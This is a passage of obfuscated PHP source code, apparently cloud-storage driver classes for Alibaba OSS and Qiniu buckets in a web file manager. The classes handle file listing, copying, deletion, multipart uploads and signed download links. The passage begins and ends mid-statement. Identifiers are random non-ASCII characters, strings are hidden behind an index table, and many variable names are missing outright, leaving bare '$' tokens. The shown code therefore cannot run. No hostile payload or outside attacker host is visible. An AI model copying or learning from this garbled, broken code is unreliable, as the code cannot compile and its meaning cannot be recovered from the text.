== 0 && substr($, strlen($) - 1, 1) == $[8] ? !0 : !1; $̭ = array($[76] => $, $[1424] => $, $[85] => strtotime($), $[1425] => $, $[1423] => $); $this->cacheMethodInfoSet($, $΅, $̭); if ($΅) { $[] = $; continue; } $ӌ[] = $򓹩; } foreach ($᭸ as $Ė) { $[] = $Ė->getPrefix(); $this->cacheMethodInfoSet($Ė->getPrefix(), !0); } if ($ۑܝ === $[12]) { break; } } $this->cacheMethodInfoSet($Ɗ, !0); return array($[82] => $, $[83] => $ӌ); } public function copyFile($, $) { $ݱƝ = $this->size($); if ($ݱƝ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $, $this->bucket, $this->pathEncode($)); } catch (OSS\Core\OssException $ק΀) { return !1; } return $this->getPathOuter($); } $ߦ = $this->multiCopyObject($, $, $ݱƝ); return $ߦ ? $this->getPathOuter($) : !1; } private function multiCopyObject($ۉ, $, $ҙ) { $ =& $_SERVER[]; try { $ = array(); if ($ǯȑ = $this->hashMd5($ۉ)) { $ = array(OSS\OssClient::OSS_HEADERS => array($[1426] => $ǯȑ)); } $ȁ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($), $); $飔ǒ = 1; $Ԧ = 0; $ = array(); $¯ = 1024 * 1024 * 10; $ = $this->client->generateMultiuploadParts($ҙ, $¯); foreach ($ as $ => $) { $񙐡 = $Ԧ + (int) $[$[1427]]; $넔 = (int) $[$[381]] + $񙐡 - 1; $ = array($[1428] => $񙐡, $[1429] => $넔); $[] = $this->client->uploadPartCopy($this->bucket, $ۉ, $this->bucket, $this->pathEncode($), $飔ǒ, $ȁ, $); $飔ǒ = $飔ǒ + 1; } $ = array(); foreach ($ as $ => $) { $[] = array($[1430] => $ + 1, $[1431] => $); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($), $ȁ, $); } catch (OSS\Core\OssException $߁) { return !1; } return !0; } public function moveFile($ꞟ, $Ȥ) { if ($this->copyFile($ꞟ, $Ȥ)) { $this->remove($ꞟ); return $this->getPathOuter($Ȥ); } return !1; } public function delFile($) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($)); } catch (OSS\Core\OssException $ٮל) { return !1; } return !0; } public function delFolder($؂Π) { $Ȯ =& $_SERVER[]; if (!$this->exist($؂Π)) { return !0; } $this->listItemCache = !1; $ڢ = $this->fileList($؂Π); $this->listItemCache = !0; $ = trim($؂Π, $Ȯ[8]) . $Ȯ[8]; if (!empty($؂Π) && $؂Π !== $Ȯ[212] && !in_array($, $ڢ[$Ȯ[82]])) { $ڢ[$Ȯ[82]][] = $; } $䜕؊ = $this->delByBatch($ڢ[$Ȯ[83]]); if (!$䜕؊) { return !1; } $䜕؊ = $this->delByBatch($ڢ[$Ȯ[82]]); if (!$䜕؊) { return !1; } return $this->delFile($); } private function delByBatch($޹) { foreach (array_chunk($޹, 1000) as $) { try { $this->client->deleteObjects($this->bucket, $); } catch (OSS\Core\OssException $) { return !1; } } return !0; } public function rename($, $) { return $this->renameObject($, $); } private function fileInfo($։, $Ӱ = false, $ = array()) { $ =& $_SERVER[]; $嫘 = array($[32] => $this->pathThis($։), $[84] => $this->getPathOuter($։), $[33] => $[214], $[76] => isset($[$[76]]) ? $[$[76]] : 0, $[175] => $this->ext($։)); if ($Ӱ) { return $嫘; } $嫘[$[215]] = $嫘[$[85]] = 0; $嫘[$[216]] = $嫘[$[217]] = !0; if (empty($)) { $ݪ = $this->objectMeta($։); if (!$ݪ) { return $嫘; } $ = array($[85] => strtotime($ݪ[$[1425]]), $[76] => $ݪ[$[1424]] + 0, $[1423] => $ݪ[$[1423]]); } if (isset($[$[1423]]) && $[$[1423]]) { $嫘[$[219]] = trim($[$[1423]], $[118]); } if (isset($[$[76]])) { $嫘[$[76]] = $[$[76]]; } if (isset($[$[85]])) { $嫘[$[85]] = $[$[85]]; } if (isset($[$[194]]) && !trim($嫘[$[85]])) { $嫘[$[85]] = $[$[194]]; } return $嫘; } private function folderInfo($ě, $ = false, $ = array()) { $ =& $_SERVER[]; $ = array($[32] => $this->pathThis($ě), $[84] => $this->getPathOuter($[8] . $ě), $[33] => $[75]); if ($) { return $; } $[$[215]] = $[$[85]] = 0; $[$[216]] = $[$[217]] = !0; if (empty($)) { $ě = rtrim($ě, $[8]) . $[8]; $Ԯݙ = $this->objectMeta($ě); if (!$Ԯݙ) { return $; } $ = array($[215] => $Ԯݙ[$[544]][$[1432]], $[85] => strtotime($Ԯݙ[$[1425]])); } if (isset($[$[85]])) { $[$[85]] = $[$[85]]; } if (isset($[$[215]])) { $[$[215]] = $[$[215]]; } return $; } public function listPath($ȼ, $ = false) { $ĩ =& $_SERVER[]; $؏ = $this->fileList($ȼ, $ĩ[8], !0); foreach ($؏[$ĩ[82]] as $ => $) { $؏[$ĩ[82]][$] = $this->folderInfo($, $, $); } foreach ($؏[$ĩ[83]] as $ => $) { $؏[$ĩ[83]][$] = $this->fileInfo($[$ĩ[32]], $, $); } return $؏; } protected function infoChildren($َ, &$) { $ =& $_SERVER[]; $ƥ = $this->fileList($َ, $[12], !0); $[$[78]] += count($ƥ[$[82]]); $[$[77]] += count($ƥ[$[83]]); foreach ($ƥ[$[83]] as $ը) { if (!$ը || !$ը[$[76]]) { continue; } $[$[76]] += $ը[$[76]]; } } public function has($, $͟ԕ = false, $ = true) { $ =& $_SERVER[]; $ = trim($, $[8]); $뙳 = empty($) && $ !== $[212] ? $[12] : $ . $[8]; $ = $[12]; $ = 500; $ƻ = $ = 0; while (!0) { check_abort(); $ᇸ = array($[1419] => $[8], $[1420] => $뙳, $[1421] => $, $[1422] => $); try { $󧭲 = $this->client->listObjects($this->bucket, $ᇸ); } catch (OSS\Core\OssException $͖) { break; } $ = $󧭲->getNextMarker(); $ = $󧭲->getObjectList(); $ = $󧭲->getPrefixList(); if ($͟ԕ) { if (count($) > 1 || count($) == 1 && $[0]->getKey() != $뙳) { $ƻ += count($) - 1; } if (!empty($)) { $ += count($); } if ($ === $[12]) { break; } continue; } if ($) { if (!empty($)) { if (count($) > 1 || $[0]->getKey() != $뙳) { return !0; } } } else { if (!empty($)) { return !0; } } if ($ === $[12]) { break; } } if ($͟ԕ) { return array($[223] => $ƻ, $[224] => $); } return !1; } public function listAll($鼉) { $󑎤 =& $_SERVER[]; $ = $this->fileList($鼉, $󑎤[12], !0); $눯Φ = array_to_keyvalue($[$󑎤[83]], $󑎤[32]); foreach ($[$󑎤[82]] as $Ӳȋ) { if (is_string($Ӳȋ)) { $눯Φ[$Ӳȋ] = array($󑎤[76] => 0); } } return $this->listAllFiles($鼉, $눯Φ); } public function canRead($) { $ =& $_SERVER[]; $ڡ = $this->pathAcl($); return $ڡ == $[1433] || $ڡ == $[587] ? !0 : !1; } public function canWrite($) { $̻ = $this->pathAcl($); return $̻ == $_SERVER[][587] ? !0 : !1; } public function pathAcl($×) { $㠻 =& $_SERVER[]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ƻ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($×)); } catch (OSS\Core\OssException $) { return !1; } $ = $ƻ == $㠻[37] ? $this->bucketAcl : $ƻ; if ($ == $㠻[1434]) { return $㠻[1433]; } if ($ == $㠻[1435]) { return $㠻[587]; } return $; } private function chmodPath($, $ɇ = '') { $ߩ =& $_SERVER[]; $ě = empty($ɇ) ? $ߩ[1435] : $ɇ; $͘ = array($ߩ[37], $ߩ[213], $ߩ[1434], $ߩ[1435]); if (!in_array($ě, $͘)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($), $ě); } catch (OSS\Core\OssException $ߊ) { return !1; } return !0; } public function getContent($) { return $this->fileSubstr($, -1); } public function setContent($ԯ, $߂گ = '') { $޻ =& $_SERVER[]; try { $ = $this->trafficLimit($޻[1436]); $ = $this->client->putObject($this->bucket, $this->pathEncode($ԯ), $߂گ, $); } catch (OSS\Core\OssException $ֻ) { return !1; } $ = array($޻[1426] => trim($[$޻[1423]], $޻[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ԯ))); $this->updateObjMeta($ԯ, $); return isset($[$޻[1437]][$޻[275]]) ? !0 : !1; } private function updateObjMeta($, $) { $ = $this->pathEncode($); try { $썧 = array(OSS\OssClient::OSS_HEADERS => $); $this->client->copyObject($this->bucket, $, $this->bucket, $, $썧); } catch (OSS\Core\OssException $) { return !1; } return !0; } public function upload($ґ, $, $ = false, $Ϡ = REPEAT_REPLACE) { $֋ƚ =& $_SERVER[]; $ = trim($ґ, $֋ƚ[8]); $Ӟ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($֋ƚ[1426] => @md5_file($)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ґ))); $Ӟ = $this->trafficLimit($֋ƚ[1436], $Ӟ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($), $, $Ӟ); } catch (OSS\Core\OssException $) { return !1; } return $this->getPathOuter($ґ); } public function getHost() { $ң =& $_SERVER[]; $ב = explode($ң[198], parent::getHost()); return $ב[0] . $ң[198] . $this->bucket . $ң[10] . $ב[1]; } public function uploadFormData($ٵ, $ҽ = 3600) { $ݪƈ =& $_SERVER[]; if (!($ª = $this->getHost())) { return !1; } $؝љ = $ҽ; $Ђ = date($ݪƈ[1438], time() + $؝љ); $ٽ = new DateTime($Ђ); $ő = $ٽ->format(DateTime::ISO8601); $ = strpos($ő, $ݪƈ[340]); $ő = substr($ő, 0, $) . $ݪƈ[1439]; $ΑȠ = 1048576000 * 5; $ׁ = $this->pathFather($ٵ); $Ҋ = array($ݪƈ[258] => $ő, $ݪƈ[261] => array(array($ݪƈ[1440], 0, $ΑȠ), array($ݪƈ[264], $ݪƈ[265], $ׁ))); $ڈ = base64_encode(json_encode($Ҋ)); $ = base64_encode(hash_hmac($ݪƈ[247], $ڈ, $this->secret, !0)); $И = array($ݪƈ[276] => $ڈ, $ݪƈ[1441] => $this->accessKey, $ݪƈ[268] => $ݪƈ[257], $ݪƈ[1442] => $, $ݪƈ[196] => $ª); $И = $this->trafficLimit($ݪƈ[1436], $И); return $И; } public function multiUploadFormData($Ӗ, $د = 3600) { $ =& $_SERVER[]; if (!($Ŏ̸ = $this->getHost())) { return !1; } $НŘ = $this->trafficLimit($[1436]); $î = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ӗ), $НŘ); return array($[238] => $î, $[196] => $Ŏ̸ . $[8] . $this->pathEncode($Ӗ), $[239] => gmdate($[1443]), $[94] => $Ӗ); } public function multiUploadAuthData($罀, $ؙ = array()) { $Ϯˤ =& $_SERVER[]; $Ԃט = isset($ؙ[$Ϯˤ[239]]) ? $ؙ[$Ϯˤ[239]] : gmdate($Ϯˤ[1443]); $ך = isset($ؙ[$Ϯˤ[175]]) ? $ؙ[$Ϯˤ[175]] : $Ϯˤ[12]; $ɒ = $罀; if (isset($ؙ[$Ϯˤ[94]])) { $ɒ = $ؙ[$Ϯˤ[94]]; unset($ؙ[$Ϯˤ[94]]); } if (isset($ؙ[$Ϯˤ[240]])) { $ؙ[$Ϯˤ[239]] = $Ԃט; return $this->listUploadParts($ɒ, $ؙ); } $ѥ = array($Ϯˤ[241], $Ϯˤ[12], $Ϯˤ[120], $Ԃט, "\170\55\x6f\163\163\55\x64\x61\x74\145\72{$Ԃט}", $Ϯˤ[8] . $this->bucket . $Ϯˤ[8] . $ɒ . $ך); if (strpos($ך, $Ϯˤ[242]) === 0) { $ѥ[0] = $Ϯˤ[243]; if ($ = $this->trafficLimit($Ϯˤ[1436])) { $ɒ = $Ϯˤ[1444]; array_splice($ѥ, 5, 0, $ɒ . $Ϯˤ[4] . $[$ɒ]); } } if (isset($ؙ[$Ϯˤ[244]]) && $ؙ[$Ϯˤ[244]] == $Ϯˤ[245]) { $ѥ[0] = $Ϯˤ[245]; } if (!empty($ؙ[$Ϯˤ[1445]])) { $˅ = array_merge(array($ѥ[4]), $ؙ[$Ϯˤ[1445]]); sort($˅); $ѥ[4] = implode($Ϯˤ[246], $˅); } $ = implode($Ϯˤ[246], $ѥ); $£ = base64_encode(hash_hmac($Ϯˤ[247], $, $this->secret, !0)); $ޕ = $Ϯˤ[1409] . $this->accessKey . $Ϯˤ[4] . $£; if (strpos($ך, $Ϯˤ[242]) === 0) { $ޕ = array($Ϯˤ[249] => $ޕ, $Ϯˤ[239] => $Ԃט); if ($) { $ޕ = array_merge($ޕ, $); } } return $ޕ; } public function listUploadParts($٭, $) { $ܛ =& $_SERVER[]; $𔅍 = parse_url_query($[$ܛ[175]]); $ɏ = $this->client->listParts($this->bucket, $this->pathEncode($٭), $𔅍[$ܛ[238]]); $˘ژ = $ɏ->getListPart(); $أ = array(); foreach ($˘ژ as $҇ᬶ) { $أ[] = array($ܛ[1430] => $҇ᬶ->getPartNumber(), $ܛ[1431] => trim($҇ᬶ->getETag(), $ܛ[118])); } unset($[$ܛ[240]], $[$ܛ[244]]); $í = $this->multiUploadAuthData($٭, $); if (empty($í)) { return !1; } return array($ܛ[249] => $í, $ܛ[239] => $[$ܛ[239]], $ܛ[251] => $أ); } public function download($, $) { if ($this->isFolder($)) { return !1; } try { $ݒ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $); $ݒ = $this->trafficLimit($_SERVER[][109], $ݒ); $this->client->getObject($this->bucket, $this->pathEncode($), $ݒ); } catch (OSS\Core\OssException $֞) { return !1; } return $; } public function fileSubstr($ϣ, $ = 0, $ = false) { if ($ === -1) { $ω = array(); } else { if ($ === !1) { $ = $this->size($ϣ); } else { $ = $ + $ - 1; } $ω = array(OSS\OssClient::OSS_RANGE => "{$}\55{$}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ϣ), $ω); } catch (OSS\Core\OssException $) { think_exception($->getMessage()); return !1; } } private function trafficLimit($䠌, $Ű = array()) { $홃 =& $_SERVER[]; if ($䠌 == $홃[1436] && $this->isUploadServer() || $䠌 == $홃[109] && $this->isFileOutServer()) { return $Ű; } $ͱ = floatval($GLOBALS[$홃[6]][$홃[89]][$홃[107]][$䠌]) * 1024 * 1024 * 8; if (!$ͱ) { return $Ű; } $ͱ = $ͱ < 819200 ? 819200 : ($ͱ > 838860800 ? 838860800 : $ͱ); $Ű[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ͱ); return $Ű; } public function link($, $в̻ = array()) { $ē =& $_SERVER[]; if (!$this->exist($) || $this->isFolder($)) { return !1; } try { $в̻ = $this->trafficLimit($ē[109], $в̻); $Ͻ = $this->client->signUrl($this->bucket, $this->pathEncode($), 3600 * 12, $ē[245], $в̻); return $this->getCdnLink($Ͻ); } catch (OSS\Core\OssException $ګ݀) { return !1; } } public function fileOut($γ, $ܗ = false, $ޏ = false, $ƕΌ = '') { $ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($γ, $ܗ, $ޏ, $ƕΌ); } if (!$ޏ) { $ޏ = $this->pathThis($γ); } $ޏ = rawurlencode($ޏ); $܍ = get_file_mime(get_path_ext($ޏ)); if ($܍ == $[232]) { return parent::fileOut($γ, $ܗ, $ޏ, $ƕΌ); } $ܗ = $ܗ ? $[1446] : $[1447]; $Ր = array(OSS\OssClient::OSS_SUB_RESOURCE => $[1448] . rawurlencode("{$ܗ}\73\146\151\x6c\x65\156\x61\x6d\145\75{$ޏ}")); $Ր[OSS\OssClient::OSS_SUB_RESOURCE] .= $[1449] . rawurlencode($܍); $Ǝ = $this->link($γ, $Ր); $this->fileOutLink($Ǝ); } public function fileOutServer($, $է = false, $˕ = false, $ަ֑ = '') { parent::fileOut($, $է, $˕, $ަ֑); } public function fileOutImage($򪯪, $ = 250) { if ($this->size($򪯪) > 1024 * 1024 * 20) { return $this->fileOutImageServer($򪯪, $); } $ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[][1450] . $); $ = $this->link($򪯪, $); $this->fileOutLink($); } public function fileOutImageServer($, $ȝƘ = 250) { parent::fileOutImage($, $ȝƘ); } public function fileOutLink($лҽ) { $ =& $_SERVER[]; if (!$this->isCdnHost() && substr($лҽ, 0, 7) == $[1371]) { $лҽ = $[1372] . substr($лҽ, 7); } header($[162] . $лҽ); die; } public function hashMd5($ԙ, $µ = '') { $ױ =& $_SERVER[]; $ѠǬ = $this->_objectMeta($ԙ); if (!$ѠǬ) { return $ױ[12]; } if (!isset($ѠǬ[$ױ[1426]]) && !empty($µ)) { $ǜ = $this->updateObjMeta($ԙ, array($ױ[1426] => $µ)); $ѠǬ[$ױ[1426]] = $ǜ ? $µ : $ױ[12]; } return isset($ѠǬ[$ױ[1426]]) ? strtolower($ѠǬ[$ױ[1426]]) : $ױ[12]; } public function size($) { $ = $this->objectMeta($); return $ ? $[$_SERVER[][76]] : 0; } public function info($Ģ) { if ($this->isFolder($Ģ)) { return $this->folderInfo($Ģ); } else { if ($this->isFile($Ģ)) { return $this->fileInfo($Ģ); } } return !1; } public function exist($꬛) { return $this->isFile($꬛) || $this->isFolder($꬛); } public function isFile($ѧ) { return !$this->isFolder($ѧ) && $this->objectMeta($ѧ); } public function isFolder($߻) { return $this->cacheMethod($_SERVER[][166], $߻); } protected function objectMeta($Ϳȝ) { return $this->cacheMethod($_SERVER[][168], $Ϳȝ); } protected function _objectMeta($ܓ) { $ =& $_SERVER[]; try { $ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ܓ)); } catch (OSS\Core\OssException $) { $ = !1; } if ($) { $[$[76]] = intval($[$[1424]]); } return $; } protected function _isFolder($ר) { $Ђ =& $_SERVER[]; if ($ר == $Ђ[12] || $ר == $Ђ[8]) { return !0; } $ = array($Ђ[1419] => $Ђ[8], $Ђ[1420] => rtrim($ר, $Ђ[8]) . $Ђ[8], $Ђ[1421] => 1, $Ђ[1422] => $Ђ[12]); $տ = $this->client->listObjects($this->bucket, $); if ($տ->getObjectList() || $տ->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($) { parent::__construct(); require_once SDK_DIR . $_SERVER[][1451]; $this->_init($); } public function _init($б) { $ =& $_SERVER[]; $this->config = $б; foreach ($б as $ => $) { if (isset($this->{$})) { $this->{$} = $; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($[1452] . LNG($[1410])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($, $« = '', $ϼ = REPEAT_RENAME) { if ($this->setContent($, $«)) { return $this->getPathOuter($); } return !1; } public function mkdir($ۛ, $ = REPEAT_SKIP) { $ =& $_SERVER[]; $ό = trim($ۛ, $[8]); if ($this->_isFolder($ό)) { return $this->getPathOuter($ό); } $ۛ = $ό . $[8]; $ُ = get_path_this($ό); $ˣ = $ۛ . $ُ; if (!$this->mkfile($ˣ)) { return !1; } if (!$this->moveFile($ˣ, $ۛ)) { $this->delFile($ˣ); return !1; } return $this->getPathOuter($ό); } public function copyFile($, $) { $ٔ = $this->bucketManager->copy($this->bucket, $, $this->bucket, $, !0); return $ٔ ? !1 : $this->getPathOuter($); } public function moveFile($, $ג) { $甾 = $this->bucketManager->move($this->bucket, $, $this->bucket, $ג, !0); return $甾 ? !1 : $this->getPathOuter($ג); } public function delFile($) { if (!$this->exist($)) { return !0; } $ = $this->bucketManager->delete($this->bucket, $); return $ ? !1 : !0; } public function delFolder($޲) { $ =& $_SERVER[]; if (!$this->exist($޲)) { return !0; } $this->listItemCache = !1; $簇 = $this->fileList($޲); $this->listItemCache = !0; $ = trim($޲, $[8]) . $[8]; if (!empty($޲) && $޲ !== $[212] && !in_array($, $簇[$[82]])) { $簇[$[82]][] = $; } $ = $this->delByBatch($簇[$[83]]); if (!$) { return !1; } $ = $this->delByBatch($簇[$[82]]); if (!$) { return !1; } return $this->delFile($); } private function delByBatch($겎) { foreach (array_chunk($겎, 1000) as $κ) { $屋 = $this->bucketManager->buildBatchDelete($this->bucket, $κ); list($Ӱ, $) = $this->bucketManager->batch($屋); if ($) { return !1; } } return !0; } public function rename($Տ, $) { return $this->renameObject($Տ, $); } public function fileInfo($ɩј, $ = false, $և = array()) { $ =& $_SERVER[]; $ˇˆ = array($[32] => $this->pathThis($ɩј), $[84] => $this->getPathOuter($[8] . $ɩј), $[33] => $[214], $[76] => isset($և[$[1453]]) ? $և[$[1453]] : 0, $[175] => $this->ext($ɩј)); if ($) { return $ˇˆ; } $ˇˆ[$[215]] = $ˇˆ[$[85]] = 0; $ˇˆ[$[216]] = $ˇˆ[$[217]] = !0; if (empty($և)) { $և = $this->objectMeta($ɩј); if (!$և) { return $ˇˆ; } } if (isset($և[$[218]]) && $և[$[218]]) { $ˇˆ[$[219]] = $և[$[218]]; } if (isset($և[$[228]]) && $և[$[228]]) { $ˇˆ[$[219]] = $և[$[228]]; } if (isset($և[$[1454]])) { $ˇˆ[$[85]] = substr($և[$[1454]] . $[12], 0, 10); } if (isset($և[$[1453]])) { $ˇˆ[$[76]] = $և[$[1453]]; } return $ˇˆ; } public function folderInfo($ɦ, $Ȍ = false) { $ =& $_SERVER[]; $е = array($[32] => $this->pathThis($ɦ), $[84] => $this->getPathOuter($[8] . $ɦ), $[33] => $[75]); if ($Ȍ) { return $е; } $е[$[215]] = $е[$[85]] = 0; $е[$[216]] = $е[$[217]] = !0; $ɦ = rtrim($ɦ, $[8]) . $[8]; $益 = $this->objectMeta($ɦ); if (isset($益[$[1454]])) { $е[$[85]] = substr($益[$[1454]] . $[12], 0, 10); } return $е; } public function listPath($, $ܜ̏ = false) { $童 =& $_SERVER[]; $ = $this->fileList($, $童[8], !0); foreach ($[$童[82]] as $孎 => $Ğ) { $[$童[82]][$孎] = $this->folderInfo($Ğ, $ܜ̏); } foreach ($[$童[83]] as $孎 => $Ğ) { $[$童[83]][$孎] = $this->fileInfo($Ğ[$童[94]], $ܜ̏, $Ğ); } return $; } public function has($݉ى, $Ԣ = false, $Թ = true) { $ =& $_SERVER[]; $݉ى = trim($݉ى, $[8]); $ª = empty($݉ى) && $݉ى !== $[212] ? $[12] : $݉ى . $[8]; $ = $[12]; $ʹ = 500; $Ϸ = $[8]; $ = $ = 0; while (!0) { check_abort(); list($ȶН, $) = $this->bucketManager->listFiles($this->bucket, $ª, $, $ʹ, $Ϸ); if ($) { break; } $ = array_key_exists($[1422], $ȶН) ? $ = $ȶН[$[1455]] : $[12]; if ($Ԣ) { if (!empty($ȶН[$[1456]])) { $ += count($ȶН[$[1456]]); } if (!empty($ȶН[$[1457]])) { $ += count($ȶН[$[1457]]); } if ($ === $[12]) { break; } continue; } if ($Թ) { if (!empty($ȶН[$[1456]])) { return !0; } } else { if (!empty($ȶН[$[1457]])) { return !0; } } if ($ === $[12]) { break; } } if ($Ԣ) { return array($[223] => $, $[224] => $); } return !1; } public function listAll($) { $үא =& $_SERVER[]; $ۉ = $this->fileList($, $үא[12], !0); $ = array_to_keyvalue($ۉ[$үא[83]], $үא[32]); foreach ($ۉ[$үא[82]] as $) { if (is_string($)) { $[$] = array($үא[76] => 0); } } return $this->listAllFiles($, $); } private function fileList($, $ = '', $䥉 = 0) { $ޘ耊 =& $_SERVER[]; $ = trim($, $ޘ耊[8]); $ = empty($) && $ !== $ޘ耊[212] ? $ޘ耊[12] : $ . $ޘ耊[8]; $ = $ޘ耊[12]; $ݡټ = 1000; $ = $䆰 = array(); while (!0) { check_abort(); list($, $) = $this->bucketManager->listFiles($this->bucket, $, $, $ݡټ, $); if ($) { break; } $ = array_key_exists($ޘ耊[1422], $) ? $ = $[$ޘ耊[1455]] : $ޘ耊[12]; $ԑ = isset($[$ޘ耊[1456]]) ? $[$ޘ耊[1456]] : array(); $ = isset($[$ޘ耊[1457]]) ? $[$ޘ耊[1457]] : array(); foreach ($ԑ as $) { if ($[$ޘ耊[94]] == $) { continue; } $ￃˋ = $[$ޘ耊[94]]; $ = $[$ޘ耊[1453]]; $[$ޘ耊[76]] = $; $ը = $ == 0 && substr($ￃˋ, strlen($ￃˋ) - 1, 1) == $ޘ耊[8] ? !0 : !1; $this->cacheMethodInfoSet($ￃˋ, $ը, $); if ($ը) { $[] = $ￃˋ; continue; } $䆰[] = $䥉 ? $ : $ￃˋ; } foreach ($ as $ￃˋ) { if ($ￃˋ == $) { continue; } $[] = $ￃˋ; $this->cacheMethodInfoSet($ￃˋ, !0); } if ($ === $ޘ耊[12]) { break; } } $this->cacheMethodInfoSet($, !0); return array($ޘ耊[82] => $, $ޘ耊[83] => $䆰); } public function canRead($) { return $this->exist($) ? !0 : !1; } public function canWrite($ٙ) { return $this->exist($ٙ) ? !0 : !1; } public function getContent($͑) { return $this->fileSubstr($͑, 0, -1); } public function setContent($, $Ǎ = '') { $ = $this->tempFile($this->pathThis($)); file_put_contents($, $Ǎ); if ($this->upload($, $)) { $this->tempFileRemve($); return !0; } return !1; } public function refreshUrls($) { $ =& $_SERVER[]; $ = array(); if (is_array($)) { foreach ($ as $) { $[] = $this->link($); } } else { $[] = $this->link($); } $ۘ = new Qiniu\Cdn\CdnManager($this->auth); list($׫, $) = $ۘ->refreshUrls($); if ($) { return !1; } return $׫[$[1221]] == $[793] ? !0 : !1; } public function fileSubstr($, $, $) { $ϯ =& $_SERVER[]; if (!($禼Ů = $this->link($))) { return !1; } $ˋ = !1; if ($ > 0) { $ = $ + $ - 1; $ˋ = array($ϯ[1458] . $ . $ϯ[430] . $); } $ = url_request($禼Ů, $ϯ[245], !1, $ˋ); return $[$ϯ[784]] ? $[$ϯ[1243]] : !1; } public function upload($, $, $˔ = false, $ = REPEAT_REPLACE) { $۠҇ = new Qiniu\Storage\UploadManager(); $ = $this->auth->uploadToken($this->bucket, $); $֌ = get_file_mime(get_path_ext($)); list($匢, $Π) = $۠҇->putFile($, $, $, null, $֌); return $Π ? !1 : $this->getPathOuter($); } public function uploadFormData($, $݇ = 3600) { return $this->uploadToken($, $݇); } public function multiUploadFormData($, $ʹʩ = 3600) { return $this->uploadToken($, $ʹʩ); } private function uploadToken($, $ٿ = 3600) { $̌ =& $_SERVER[]; $؉ = $ٿ; $ = array($̌[1459] => $̌[1460]); $ = $; $ = $this->auth->uploadToken($this->bucket, $, $؉, $, !0); $խ = empty($this->region) || $this->region == $̌[1461] ? $̌[12] : $̌[430] . $this->region; $ = http_type() . "\x3a\57\57\165\x70\154\x6f\x61\144{$խ}\56\161\x69\156\151\x75\160\56\143\157\155\57"; return array($̌[1462] => $, $̌[1463] => $); } public function download($ϭ, $) { $ = IO::getPathInner(IO::mkfile($)); if (!($̟ = $this->link($ϭ))) { return !1; } $ = 0; $޸ծ = 1024 * 200; $˥ = fopen($, $_SERVER[][1464]); while (!0) { $Ѣ = $this->fileSubstr($ϭ, $, $޸ծ); if ($Ѣ === !1) { return !1; } fwrite($˥, $Ѣ); $ += $޸ծ; if (strlen($Ѣ) < $޸ծ) { break; } } fclose($˥); return $; } public function link($Ɲ١, $ = '') { if (!$this->isFile($Ɲ١)) { return !1; } $ = $this->getHost() . $_SERVER[][8] . $this->pathEncode($Ɲ١) . $; return $this->auth->privateDownloadUrl($, 3600 * 12); } public function fileOut($, $ټƗ = false, $܆ = false, $ه = '') { $݈ =& $_SERVER[]; if ($this->isFileOutServer()) { return $this->fileOutServer($, $ټƗ, $܆, $ه); } if (!$܆) { $܆ = $this->pathThis($); } $ = $ټƗ ? $݈[1465] . rawurlencode($܆) : $݈[12]; $顓 = $this->link($, $); $this->fileOutLink($顓); } public function fileOutServer($, $ = false, $񝷪 = false, $Α = '') { parent::fileOut($, $, $񝷪, $Α); } public function fileOutImage($⑤, $̘ = 250) { $ = $this->link($⑤, $_SERVER[][1466] . $̘); $this->fileOutLink($); } public function fileOutImageServer($ٗ, $巚 = 250) { parent::fileOutImage($ٗ, $巚); } public function hashMd5($§ʔ) { $ =& $_SERVER[]; $ᳱ = $this->objectMeta($§ʔ); return isset($ᳱ[$[228]]) ? $ᳱ[$[228]] : !1; $ȓ = $this->link($§ʔ, $[1467]); } public function size($̬) { $構 = $this->objectMeta($̬); return $構 ? $構[$_SERVER[][76]] : 0; } public function info($) { if ($this->isFolder($)) { return $this->folderInfo($); } else { if ($this->isFile($)) { return $this->fileInfo($); } } return !1; } public function exist($Ϩޮ) { return $this->isFile($Ϩޮ) || $this->isFolder($Ϩޮ); } public function isFile($) { return !$this->isFolder($) && $this->objectMeta($); } public function isFolder($) { return $this->cacheMethod($_SERVER[][166], $); } protected function objectMeta($) { return $this->cacheMethod($_SERVER[][168], $); } protected function _objectMeta($᷾) { $ѷ =& $_SERVER[]; list($, $ڻΙ) = $this->bucketManager->stat($this->bucket, $᷾); if ($) { $[$ѷ[76]] = intval($[$ѷ[1453]]); } return $; } protected function _isFolder($֢) { $ȸ =& $_SERVER[]; if ($֢ == $ȸ[12] || $֢ == $ȸ[8]) { return !0; } list($, $) = $this->bucketManager->listFiles($this->bucket, trim($֢, $ȸ[8]) . $ȸ[8], $ȸ[12], 1, $ȸ[8]); return !empty($[$ȸ[1456]]) || !empty($[$ȸ[1457]]) ? !0 : !1; } } goto a臈; B: class DbSqlite3 extends DbSqlite3Base { public function query($ᡜ) { $ =& $_SERVER[]; if (!CacheLock::fileLock($[13])) { return !1; } $غ = parent::query($ᡜ); 